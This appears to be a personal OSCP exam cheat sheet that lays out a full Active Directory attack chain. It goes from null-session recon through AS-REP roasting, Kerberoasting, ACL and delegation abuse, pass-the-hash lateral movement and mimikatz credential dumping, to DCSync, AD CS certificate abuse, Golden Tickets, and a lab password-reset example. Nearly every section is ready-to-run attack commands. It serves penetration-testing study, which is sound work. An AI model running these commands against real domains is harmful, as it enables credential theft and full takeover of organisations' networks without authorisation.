# Active Directory Attack Chain — OSCP Methodology

Chronological, exam-ready reference: unauthenticated recon → credentialed enum → abuse → lateral movement → domain compromise → persistence.

---

## 0. Setup

```bash
# Add DC to /etc/hosts (do this immediately, everything downstream depends on it)
echo "<DC_IP>  <domain.local> <DC-HOSTNAME>.<domain.local>" | sudo tee -a /etc/hosts

# Time sync (Kerberos fails hard on clock skew >5min)
sudo ntpdate <DC_IP> 2>/dev/null || sudo rdate -n <DC_IP>
```

---

## 1. Unauthenticated / Null Session Enumeration

```bash
# Port sweep — full TCP, then UDP top ports
nmap -p- -sC -sV -oN nmap_full.txt <DC_IP>
sudo nmap -sU --top-ports 100 -oN nmap_udp.txt <DC_IP>

# SMB null session
nxc smb <DC_IP> -u '' -p '' --shares
smbclient -N -L //<DC_IP>/

# RPC null session
rpcclient -U "" -N <DC_IP>
# inside rpcclient: enumdomusers ; enumdomgroups ; querydominfo ; enumprivs

# LDAP anonymous bind
ldapsearch -x -H ldap://<DC_IP> -b "DC=<domain>,DC=local" -s sub "(objectclass=*)" | less
nxc ldap <DC_IP> -u '' -p '' --get-desc-users   # description field often leaks creds

# Username enumeration via Kerberos (no creds needed if valid usernames guessed)
kerbrute userenum -d <domain.local> --dc <DC_IP> -o kerbrute.userenum.out userlist.txt

# Grab the users
grep VALID kerbrute.userenum.out | awk '{print $7}' | awk -F\@ '{print $1}' > users.list

# DNS zone transfer attempt
dig axfr @<DC_IP> <domain.local>

# SMB signing / relay potential
nxc smb <DC_IP> --gen-relay-list relay_targets.txt
```

**Decision point:** null/guest SMB access → dump shares (`smbclient`, `nxc smb --shares -u '' -p ''`) and grep for creds. LDAP anon bind works → pull full user/group/description dump before you have creds at all.

---

## 2. Initial Foothold → Credentials

If no creds yet, the DC is rarely the first box — pivot from a workstation/web app foothold. Once _any_ cred/hash obtained:

```bash
# Validate creds across the domain
nxc smb <DC_IP> -u <user> -p '<pass>'
nxc smb <DC_IP> -u <user> -H <NTLM_hash>

nxc smb <ip> -u user -p pass -M change-password -o NEWPASS=NewPassword
nxc smb <ip> -u user -p pass -M change-password -o NEWNTHASH=31d6cfe0d16ae931b73c59d7e0c089c0

# AS-REP Roasting — no creds needed if you have a valid username list
GetNPUsers.py <domain.local>/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
# or authenticated, dump all UF_DONT_REQUIRE_PREAUTH accounts
GetNPUsers.py <domain.local>/<user>:<pass> -request -format hashcat -outputfile asrep.hash

# Password spraying (careful — lockout policy!)
crackmapexec smb <DC_IP> -u users.txt -p 'Company2026!' --continue-on-success
nxc smb <DC_IP> -u users.txt -p 'Season2026!' --continue-on-success
```

**Decision point:** got AS-REP hash → `hashcat -m 18200 asrep.hash rockyou.txt`. Cracked → go to §3 with real creds.

---

## 3. Credentialed Enumeration

```bash
# Full domain enum with BloodHound collector
bloodhound-python -u <user> -p '<pass>' -d <domain.local> -ns <DC_IP> -c All --zip

# rusthound-ce
rusthound-ce --domain <domain> -u <user> -p <password> -z

# bloodhound-ce
cd .config/bloodhound
docker-compose up -d

# nxc one-liners for quick wins
nxc smb <DC_IP> -u <user> -p '<pass>' --users
nxc smb <DC_IP> -u <user> -p '<pass>' --groups
nxc smb <DC_IP> -u <user> -p '<pass>' --loggedon-users
nxc smb <DC_IP> -u <user> -p '<pass>' --shares
nxc smb <DC_IP> -u <user> -p '<pass>' -M spider_plus   # crawl all shares for files

# LDAP deep dump (windapsearch / ldapdomaindump)
ldapdomaindump -u '<domain>\<user>' -p '<pass>' <DC_IP>
windapsearch.py -d <domain.local> -u <user>@<domain.local> -p '<pass>' --da   # Domain Admins
windapsearch.py -d <domain.local> -u <user>@<domain.local> -p '<pass>' -PU    # privileged users

# bloodyAD — modern LDAP swiss-army-knife
bloodyAD --host <DC_IP> -d <domain.local> -u <user> -p '<pass>' get writable
```

**Decision point:** always open the BloodHound ingest and run **Shortest Path to Domain Admins** + **Shortest Path from Owned** first — this determines every remaining step.

---

## 4. Kerberoasting

```bash
# Request/crack TGS for accounts with SPNs
GetUserSPNs.py <domain.local>/<user>:<pass> -request -outputfile kerberoast.hash
hashcat -m 13100 kerberoast.hash rockyou.txt

# Target only high-value SPNs (skip noise, exam-friendly)
GetUserSPNs.py <domain.local>/<user>:<pass> -request-user <svc_account>
```

**Decision point:** cracked SPN account → check its group memberships in BloodHound before doing anything else; service accounts are frequently over-privileged (DA nested, or local admin on a target).

---

## 5. ACL Abuse

```bash
# Enumerate abusable ACEs directly (or read off BloodHound edges)
bloodyAD --host <DC_IP> -d <domain.local> -u <user> -p '<pass>' get object <target> --attr nTSecurityDescriptor
```

|BloodHound edge|Exploit|
|---|---|
|`GenericAll` on user|Reset password: `bloodyAD ... set password <target> '<newpass>'`|
|`GenericAll` / `GenericWrite` on group|Add self: `bloodyAD ... add groupMember <group> <user>`|
|`WriteDACL`|Grant self full control, then abuse it: `bloodyAD ... add genericAll <target> <user>`|
|`WriteOwner`|Take ownership → grant self rights: `Set-DomainObjectOwner` (PowerView) then `Add-DomainObjectAcl`|
|`ForceChangePassword`|`net rpc password <target> '<newpass>' -U <domain>/<user>%<pass> -S <DC_IP>` or `bloodyAD ... set password`|
|`AddMember` on group|`bloodyAD ... add groupMember <group> <user>`|
|`AddSelf`|Same as AddMember, self-service|
|`ReadGMSAPassword`|`gMSADumper.py -u <user> -p '<pass>' -d <domain.local>`|
|`AllowedToDelegate` (constrained deleg)|See §6|
|`AddAllowedToAct` (RBCD)|See §6|

**Decision point:** every ACE above chains into full credential material for the target principal — always re-run BloodHound path analysis after each hop, new privileges can open new edges.

---

## 6. Delegation Abuse

```bash
# Unconstrained delegation — coerce DC auth, then extract TGT from memory
# (identify via BloodHound: UNCONSTRAINED edge, or:)
Get-DomainComputer -Unconstrained   # PowerView
# on compromised unconstrained box: run Rubeus monitor, then coerce
Rubeus.exe monitor /interval:5 /nowrap
python3 PetitPotam.py -u <user> -p '<pass>' <listener_ip> <DC_IP>

# Constrained delegation (S4U2Self/S4U2Proxy)
getST.py -spn <target_SPN> -impersonate Administrator <domain.local>/<svc_account>:'<pass>'
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <domain.local>/Administrator@<target_host>

# Resource-Based Constrained Delegation (RBCD) — needs GenericWrite/GenericAll on target computer object
# 1. Add a fake computer account (if MachineAccountQuota > 0)
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Passw0rd!' <domain.local>/<user>:'<pass>'
# 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on target
rbcd.py -delegate-from 'EVIL$' -delegate-to '<target_computer>$' -action write <domain.local>/<user>:'<pass>'
# 3. Get ST impersonating Administrator via the fake computer
getST.py -spn cifs/<target_computer>.<domain.local> -impersonate Administrator '<domain.local>/EVIL$:Passw0rd!'
export KRB5CCNAME=Administrator.ccache
wmiexec.py -k -no-pass <domain.local>/Administrator@<target_computer>.<domain.local>
```

**Decision point:** MachineAccountQuota check first (`Get-DomainObject -Identity <domain> -Properties ms-DS-MachineAccountQuota`) — RBCD requires it >0 (default 10) unless you already control a computer object.

---

## 7. Lateral Movement

```bash
# Pass-the-hash / pass-the-password across hosts
nxc smb <target> -u <user> -H <NTLM_hash> -x whoami
evil-winrm -i <target> -u <user> -H <NTLM_hash>
psexec.py <domain.local>/<user>@<target> -hashes :<NTLM_hash>
wmiexec.py <domain.local>/<user>:'<pass>'@<target>

# Pass-the-ticket
export KRB5CCNAME=<ticket.ccache>
psexec.py -k -no-pass <domain.local>/<user>@<target>

# MSSQL lateral movement (if enumerated)
nxc mssql $target -u usernames.txt -p 'MSSQLP@ssw0rd!' --local-auth

mssqlclient.py <domain.local>/<user>:'<pass>'@<target> -windows-auth
# inside: EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami';
# SQL> enable_xp_cmdshell 
# SQL> xp_cmdshell whoami

# Overpass-the-hash (NTLM → Kerberos ticket)
getTGT.py <domain.local>/<user> -hashes :<NTLM_hash>
export KRB5CCNAME=<user>.ccache
```

**Decision point:** local admin on a box via any method → dump SAM/LSASS immediately (§8) before moving on; credential reuse across the domain is common in OSCP labs.

---

## 8. Credential Dumping (post-local-admin)

```bash
# nxc lsassy
nxc smb 192.168.202.141 -u 'username' -p 'pass' -M lsassy

# Remote SAM/LSA dump (no binary drop)
nxc smb <target> -u <user> -p '<pass>' --sam
nxc smb <target> -u <user> -p '<pass>' --lsa

# secretsdump — full remote dump incl. cached domain creds
secretsdump.py <domain.local>/<user>:'<pass>'@<target>

# LSASS dump if interactive/RDP access (mimikatz)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets /export

.\mimikatz.exe "privilege::debug" "token::elevate" "log" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "sekurlsa::tickets" "exit"

mimikatz.exe "privilege::debug" "lsadump::secrets" "exit"

# gMSA passwords (if ReadGMSAPassword right held)
gMSADumper.py -u <user> -p '<pass>' -d <domain.local>
```

**Decision point:** any Domain Admin or high-value hash recovered here → jump straight to §9 (DCSync) instead of continuing lateral movement.

---

## 9. Domain Compromise — DCSync

```bash
# Requires Replicating Directory Changes / Replicating Directory Changes All on the account
secretsdump.py <domain.local>/<user>:'<pass>'@<DC_IP>
# extract krbtgt + Administrator NTLM from output

# Same via mimikatz if interactive on DC
mimikatz # lsadump::dcsync /domain:<domain.local> /user:Administrator
```

**Decision point:** krbtgt hash obtained → proceed to §10 for Golden Ticket persistence (only if the engagement scope/exam rules call for demonstrating persistence).

---

## 10. AD CS Abuse (if CA present)

```bash
# Enumerate vulnerable templates
certipy find -u <user> -p '<pass>' -dc-ip <DC_IP> -vulnerable

# ESC1 — template allows SAN, low-priv enroll, no manager approval
certipy req -u <user> -p '<pass>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template '<VULN_TEMPLATE>' -upn Administrator@<domain.local>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

# ESC8 — NTLM relay to AD CS web enrollment
certipy relay -target 'http://<CA_HOST>/certsrv/certfnsh.asp'
# coerce auth from DC (PetitPotam/PrinterBug) into the relay listener
python3 PetitPotam.py -u <user> -p '<pass>' <kali_ip> <DC_IP>
```

**Decision point:** ESC1/ESC8/ESC4 all end the same way — a Certipy `.pfx` for Administrator → `certipy auth` → NT hash → PtH into DC.

---

## 11. Golden / Silver Ticket (persistence)

```bash
# Golden Ticket — full domain persistence (needs krbtgt hash + domain SID)
lookupsid.py <domain.local>/<user>:'<pass>'@<DC_IP> | grep "Domain SID"
ticketer.py -nthash <krbtgt_NTLM> -domain-sid <SID> -domain <domain.local> Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <domain.local>/Administrator@<DC_IP>

# Silver Ticket — single-service persistence (needs service account hash, no DC contact needed to forge)
ticketer.py -nthash <svc_NTLM> -domain-sid <SID> -domain <domain.local> -spn cifs/<target>.<domain.local> Administrator
```

Note: DCSync (§9) and Golden Ticket are the classic end-state — everything before this builds toward one of these two.

---

## Priority Fast-Path (try first, in this order)

1. **Null/anon SMB + LDAP enum** — cheap, sometimes hands you creds outright (description fields, shares).
2. **AS-REP Roasting** against a scraped/guessed userlist — zero creds required.
3. **BloodHound ingest + Shortest Path to DA** as soon as ANY valid creds are obtained — this single step usually reveals the whole chain.
4. **Kerberoasting** — cheap, high hit-rate on weak service account passwords.
5. **ACL abuse (GenericAll/WriteDACL/ForceChangePassword)** flagged by BloodHound — often a 2-hop chain to DA.
6. **Credential reuse / PtH across hosts** once any local admin hash is obtained.
7. **DCSync** the moment Replicating Directory Changes rights or a DA-equivalent hash appears.

---

**Documentation reminder:** for every command above, log _which enumeration output_ justified running it (e.g. "ran GetUserSPNs because BloodHound showed 3 SPN-set accounts") — OSCP reports are graded on demonstrated reasoning, not just successful exploitation.

# WriteOwner - Change Password

We have 'ryan', the 'ca_svc' is the target:
```powershell
Import-Module .\PowerView.ps1

Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"

Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan"

$cred = ConvertTo-SecureString "Password123!!" -AsPlainText -Force

Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred
```

Check:
```sh
nxc smb sequel.htb -u ca_svc -p 'Password123!!'
```